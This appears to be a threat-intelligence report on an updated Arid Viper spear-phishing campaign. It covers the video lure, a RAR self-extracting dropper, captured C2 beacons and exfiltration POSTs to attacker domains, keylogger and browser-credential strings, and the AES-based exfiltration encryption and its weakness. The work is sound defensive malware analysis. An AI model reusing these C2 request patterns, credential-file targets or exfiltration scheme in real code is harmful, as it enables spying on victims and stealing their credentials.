Delivering a backdoor and spyware, this campaign was designed to steal information\nfrom infected systems using a malware client capable of filtering out “uninteresting” files, and\nspread primarily via a targeted phishing email usually promising a pornographic video.\n\nThe infection chain described in the initial analyses was fairly straightforward: To access the\nvideo content, the recipient had to open an attached RAR archive file – or less frequently,\n[click a link to a RAR – that extracted an SCR (Windows screensaver) file, which in turn drops](https://blog.malwarebytes.org/fraud-scam/2014/11/rogue-scr-file-links-circulating-in-steam-chat/)\ntwo files: a malicious EXE with the name of a legitimate file (such as “skype.exe”), and a\nvideo format file, usually FLV or MPG.\n\nDespite the apparent severity and extent of this threat, little has been written about it in the\nintervening months, and the operation appeared to be dormant. However, Proofpoint\nresearchers recently intercepted and analyzed phishing emails distributing Arid Viper\nmalware payloads with some noteworthy updates.\n\nAs with the originally documented examples, these messages were part of narrow\ncampaigns targeting specific industry verticals: telecoms, high tech, and business services,\nprimarily in Israel.\n\nIn these samples, the spear-phishing email contained a link to a RAR file hosted on\nMediaFire – no attachments were observed. Instead of a pornographic video, the actors\nshowed a change in TTP by using as lure a video of a fiery automobile accident.\n\nהתאונה בכביש // Road accident\n\nוידיו מזעזע דלפ תקשורת // And his shocking leaked to the media\n\n\n-----\n\nClicking the linked RAR brings up a prompt to download the file this.morning.rar to their\ncomputer. (Fig. 1)\n\n_Figure 1: Prompt to download RAR to local system_\n\nThe file “this.morning” is a RAR self-extracting (SFX) archive\n(cd89897a2b6946a332354e0609c0b8b4). Once downloaded, the user opens the RAR which\nextracts what appears to be a video file named “this.morning”.\n\nIn fact, double-clicking RAR SFX extracts and executes two files contained in this archive:\n\nA non-malicious video file: this.morning.flv (41bf348254b921bbd21350a70f843683)\nThe malware payload: chrome.exe (2ae0f580728c43b3a3888dfbe76ad689)\n\n\n-----\n\nIn this regard, the infection chain is still similar to that described in the original Operation Arid\nViper analysis, but with noticeable changes to the filenames and email lure, among others.\nThe end user will see the promised video, while in the background the malicious\n“chrome.exe” begins is communication with the command and control (C2) server: in both\ncases the action is automatic and initiated simply by double-clicking the self-extracting the\nRAR SFX archive, with no further interaction by the end-user needed. The following is an\nexample of the initial C2 beacon:\n```\nGET /Sounds/sound_q.php?p=—[redacted]. HTTP/1.1\nAccept: text/*\nUser-Agent: AudioDrive\nAccept-Language: en-us\nContent-Type: application/x-www-form-urlencoded\nHost: oowdesign [.] com \nCache-Control: no-cache\n\n```\nAnd this is an example of the C2 server response:\n\n\n-----\n\n```\nHTTP/1.1 200 OK\nServer: nginx\nDate: Wed, 26 Aug 2015 14:11:52 GMT\nContent-Type: text/html\nTransfer-Encoding: chunked\nConnection: keep-alive\nVary: Accept-Encoding\nX-Powered-By: PHP/5.3.29\na\n.\nyes;\n0\n\n```\nThe malware payload still uses the type of hard drive and a set of numbers as a unique\nidentifier; for example: VMware-VMwareVirtualSSCSIDisk—[redacted].. Moreover, the\nmalware compile time appears to be quite recent. (Fig. 2)\n\n\n-----\n\n_Figure 2: Malware file details showing compile date_\n\nThe Trojan continues to exhibit its behavior of downloading an update following the first C2\ncommunication, and in this case Proofpoint researchers succeeded in patching the initial\nmalware to obtain the second stage malware payload\n(3a401a679d147b070eb8ccae5df3dc43), which allowed us to observe more activities.\n\nPreviously described as the Operation Arid Viper backdoor, the second stage payload was\nobserved in traffic to be obfuscated with standard base64-encoding. The second-stage\nbackdoor has a compile date prior to the first stage malware by nearly a day. (Fig. 3)\n\n\n-----\n\n_Figure 3: Malware file details showing compile date_\n\nDuring the infection process, the Arid Viper malware makes multiple HTTP GET requests to\nregister the client with the server and check for updates:\n```\nGET /designs/new_user.php?s1=[---UID---]&s2=8 HTTP/1.1 àcall PHP script to login /\nregister the infected machine\nGET /designs/is_ok.php?s1=[---UID---] HTTP/1.1 à call PHP script to perform a user\ncheck on the server side (server responds with “OK”)\nGET /designs/add_recoord.php?s1=[---UID---]&s2=8&s3=2[---Date---]&s4=msn à call PHP\nscript to add a record to the server\nGET /designs/get_t.php?s1=[---UID---]&s2=[---Date---]\nGET /designs/add_t.php?s1=[---UID---]&s2=[---Date---]\nGET /designs/get_r.php?s1=[---UID---]\n\n```\nIn addition, the backdoor POSTs data back to the server:\n\n\n-----\n\n```\nPOST /designs/drive_update.php HTTP/1.1 à encrypted data wrapped in a custom base64\nencoding is sent via HTTP POST to the C2 server\nUser-Agent: Realtek\nContent-Type: application/x-www-form-urlencoded\nHost: smilydesign [.] com\nContent-Length: 978\nPragma: no-cache\n\n```\nThe Arid Viper backdoor also sends GETs to confirm the existence of interesting data / files,\nwith the path and filenames included in the request. The following exchanges show the GET\nrequest (with filename and path in bold), and C2 server response (i.e., “OK”):\n\n\n-----\n\n```\nGET /designs/send_request_r_data.php?s1\n[redacted]&path=C:/Users/COMPUTER/AppData/Roaming/Mozilla/Firefox/Profiles/[redacted].\n HTTP/1.1\nAccept: text/*\nUser-Agent: Realtek\nAccept-Language: en-us\nContent-Type: application/x-www-form-urlencoded\nHost: smilydesign.com\nCache-Control: no-cache\nHTTP/1.1 200 OK\nServer: nginx\nDate: Thu, 27 Aug 2015 11:48:19 GMT\nContent-Type: text/html\nContent-Length: 7\nConnection: keep-alive\nKeep-Alive: timeout=60\nX-Powered-By: PHP/5.3.10-1ubuntu3.17\nVary: Accept-Encoding\ndone\nGET /designs/send_request_r_data.php?s1=\n[redacted]&path=C:/Users/COMPUTER/AppData/Roaming/Mozilla/Firefox/Profiles/[redacted].\n HTTP/1.1\nAccept: text/*\nUser-Agent: Realtek\nAccept-Language: en-us\nContent-Type: application/x-www-form-urlencoded\nHost: smilydesign [.] com\nCache-Control: no-cache\n\n```\n\n-----\n\n```\nHTTP/1.1 200 OK\nServer: nginx\nDate: Thu, 27 Aug 2015 11:48:19 GMT\nContent-Type: text/html\nContent-Length: 7\nConnection: keep-alive\nKeep-Alive: timeout=60\nX-Powered-By: PHP/5.3.10-1ubuntu3.17\nVary: Accept-Encoding\ndone\n\n```\nIn addition, analysis of the Arid Viper backdoor binary shows evidence of keylogging\ncapabilities:\n```\n00000006E2C4  00000046F2C4   0  [The Right KeyPressed]\n00000006E2F4  00000046F2F4   0  [The LeFT Key Pressed]\n00000006E324  00000046F324   0  [The Down Key Is Pressed]\n00000006E358  00000046F358   0  [The Up Key Is Pressed]\n00000006E388  00000046F388   0  [left alt+shift]\n00000006E3AC  00000046F3AC   0  [right alt+shift]\n00000006E3D0  00000046F3D0   0  [Caps Lock]\n00000006E3E8  00000046F3E8   0  [Tab Pressed]\n00000006E404  00000046F404   0  [Back space Pressed...]\n\n```\nAs well as the ability to steal browser data:\n\n\n-----\n\n```\n00000006DC30  00000046EC30   0  \\logins.json\n00000006DC40  00000046EC40   0  \\key3.db\n00000006DC4C  00000046EC4C   0  \\Mozilla\\Firefox\\Profiles\\\n00000006DC68  00000046EC68   0  .default\n00000006DC74  00000046EC74   0  \\Mozilla\\Firefox\\Profiles\\*.*\n00000006DC94  00000046EC94   0  \\Google\\Chrome\\User Data\\Default\\Login Data\n00000006DCC0  00000046ECC0   0  <i l=\"%ws\" u=\"%ws\" p=\"%ws\"/>\n00000006DCE9  00000046ECE9   0 \nUsername: %ws\n00000006DCF8  00000046ECF8   0 \nPassword: %ws\n00000006DD0C  00000046ED0C   0  Software\\Microsoft\\Internet\nExplorer\\IntelliForms\\Storage2\n\n```\nThe Arid Viper backdoor encrypts data to be exfiltrated in order to avoid detection, and after\nadditional analysis Proofpoint researchers succeeded in determining its encryption routine.\n\n**Data Exfiltration**\n\nThe updated data exfiltration of the new Arid Viper backdoor functions similarly to previously\ndocumented versions. The table below lists some of the different functionalities paired with\nthe actor-assigned indicator, which can be seen in both the HTTP client body along with\nexfiltrated data as well as in the URI once exfiltration is complete. (Table 1)\n\n\n**Exfiltration**\n**type**\n\n\n**Description**\n\n\nmsn Computer name, user name, as well as Windows Live credentials (if found)\nare exfiltrated as plaintext data before encryption\n\ntree A “directory tree” of files and directories. This is stored compressed in a\npassword-protected zip.\n\nlog A keylog containing a list of programs and keystrokes recorded in each\nprogram. This file is transmitted in a password-protected zip.\n\n\n-----\n\nrfile A password-protected zip containing the exfiltrated file named as file.dll as\nwell as a text file (name.txt) containing the original full path and name of the\nexfiltrated file.\n\nimg Screenshots are taken every ~5 minutes in the initial function. Several\nscreenshots are then compressed into a password-protected zip file\n\n_Table 1: Arid Viper exfiltration types and descriptions_\n\nCaptured C2 traffic provides an example of the network traffic seen during a msn data\nexfiltration. (Fig. 4)\n\n_Figure 4: Example network traffic during data exfiltration_\n\nAlthough the data that is exfiltrated and the manner in which it is gathered remain largely the\nsame as in previously documented versions, the final result that is transmitted to an attackercontrolled server has changed significantly. In an older version of this backdoor (md5:\naefea9d795624da16d878dc9bb81bf87), exfiltrated data was simply base64-encoded using a\n\n\n-----\n\nslightly modified base64 alphabet ( - instead of + ). In the newer version, prior to base64\nencoding the exfiltrated data is first encrypted with AES-256 in CBC mode. The encryption\nprocess is depicted in Figure 5 and explained below.\n\n_Figure 5: Arid Viper encryption process for data exfiltration_\n\nTo generate the key/IV pair, first the malware randomly generates 60 bytes of data. From\nthis, the first 32-bytes are used for the key, the next byte is skipped, and the following 16\nbytes are used for the IV. After encryption, the key, separator byte, IV, leftover bytes and\npadding are then encoded into a 512-byte block of data and prepended to the encrypted\ndata. The encoded key/IV and encrypted data are then base64-encoded using the same\nmodified alphabet. Just like in the older version, this data is then appended to the final\nvariable in the POST’s HTTP client body and sent to an attacker-controlled server.\n\n**Reinventing the wheel**\n\nNumerous examples over the years have served to remind us that designing your own\ncryptography implementation is difficult and usually ill-advised. The authors of the updated\nArid Viper backdoor seem to have overlooked this lesson for, although certain measures\nhave been taken to protect the generated secret keys and IVs, their implementation is\n\n\n-----\n\nsusceptible to a brute force attack, often capable of finding the correct key/IV combination in\nless than one second. Cracking the encryption scheme applied to the traffic in Figure 4\nreveals the following decrypted cleartext. (Fig. 6)\n\n_Figure 6: Decrypted data from example network traffic in Figure 4_\n\nDetermining the encryption scheme that is applied to the updated Arid Viper backdoor’s\nexfiltrated data enables us to better detect C2 communication while also rapidly determining\nthe extent and impact of the data breach carried out by the malware client.\n\n**Conclusion**\n\nIn summary, this update to Operation Arid Viper demonstrates that despite its relatively low\nprofile since February the Arid Viper / Desert Falcons threat still has teeth and remains a risk\nfor organizations in Israel and elsewhere. While the overall attack profile observed in recent\nexamples remains similar to the originally documented campaigns, the recent campaigns\nexhibit several important updates:\n\nUse of links instead of attachments\nNew lures: still using pornographic video but most recent detections also included lures\nfor auto accident footage\n\n\n-----\n\nNew executable name: originally reported using skype.exe (and variations on\n“skype”), the recent samples used “chrome.exe”\nNew C2 domains\nAdded encryption for exfiltrated data\n\nThe return of Operation Arid Viper shows that targeted attacks can remain a threat even –\nand especially – when they are no longer in the headlines,\n\n_References_\n\n[1]
